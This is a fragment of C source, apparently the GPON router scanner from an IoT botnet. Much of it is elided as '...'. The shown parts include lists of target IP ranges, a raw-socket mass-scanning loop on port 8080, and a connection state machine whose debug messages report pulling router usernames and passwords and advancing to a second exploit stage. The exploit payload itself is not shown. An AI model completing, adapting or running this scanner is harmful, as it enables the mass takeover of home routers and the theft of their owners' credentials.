...
//int gpon8080_ranges [] = {187,189,200,201,207};
//int gpon8080_ranges [] = {187,189,200,201,207,41,42,58,62,78,82,84,88,89,91,92,95,103,113,118,145,147,178,183,185,195,210,212};
...
void gpon8080_scanner(void)
{
    ...
    {
        #ifdef DEBUG
            printf("[gpon] failed to initialize raw socket, cannot scan\n");
        #endif
        exit(0);
    }
    ...
    {
        #ifdef DEBUG
            printf("[gpon] failed to set IP_HDRINCL, cannot scan\n");
        #endif
        close(gpon8080_rsck);
        exit(0);
    }
    ...
    #ifdef DEBUG
        printf("[gpon] scanner process initialized. scanning started.\n");
    #endif
    ...
    while(TRUE)
    {
        ...
        for(i = 0; i < GPON8080_SCANNER_MAX_CONNS; i++)
        {
            ...
            {
                #ifdef DEBUG
                    printf("[gpon] FD%d timed out (state = %d)\n", conn->fd, conn->state);
                #endif
        ...
        for(i = 0; i < GPON8080_SCANNER_MAX_CONNS; i++)
        {
            ...
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                {
                    #ifdef DEBUG
                        printf("[gpon] FD%d error while connecting = %d\n", conn->fd, err);
                    #endif
            ...
            if(FD_ISSET(conn->fd, &fdset_rd))
            {
                while(TRUE)
                {
                    ...
                    {
                        #ifdef DEBUG
                            printf("[gpon] FD%d connection gracefully closed (stage %d)\n", conn->fd, conn->state);
                        #endif
                        errno = ECONNRESET;
                        ret = -1;
                    }
                    if(ret == -1)
                    {
                        if(errno != EAGAIN && errno != EWOULDBLOCK)
                        {
                            ...
                            {
                                #ifdef DEBUG
                                    printf("[gpon] FD%d resetting connection preparing to continue with stage 2 of the exploit\n", conn->fd);
                                #endif
                                close(conn->fd);
                                gpon8080_setup_connection(conn);
                                continue;
                    ...
                    if(conn->state == GPON8080_SC_GET_CREDENTIALS)
                    {
                        ...
                        while(out != NULL)
                        {
                            ...
                            {
                                #ifdef DEBUG
                                    printf("[gpon] FD%d parsing credentials...\n", conn->fd);
                                #endif
                    ...
                    {
                        #ifdef DEBUG
                            printf("[gpon] FD%d failed to retrieve credentials\n", conn->fd);
                        #endif
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = GPON8080_SC_CLOSED;
                    ...
                    {
                        #ifdef DEBUG
                            printf("[gpon] FD%d retrieved user: %s, pass: %s changing exploit stages\n", conn->fd, conn->credentials[0], conn->credentials[1]);
                        #endif
...
static void gpon8080_setup_connection(struct gpon8080_scanner_connection *conn)
{
    ...
    {
        #ifdef DEBUG
            printf("[gpon] failed to call socket()\n");
        #endif
        return;
    }
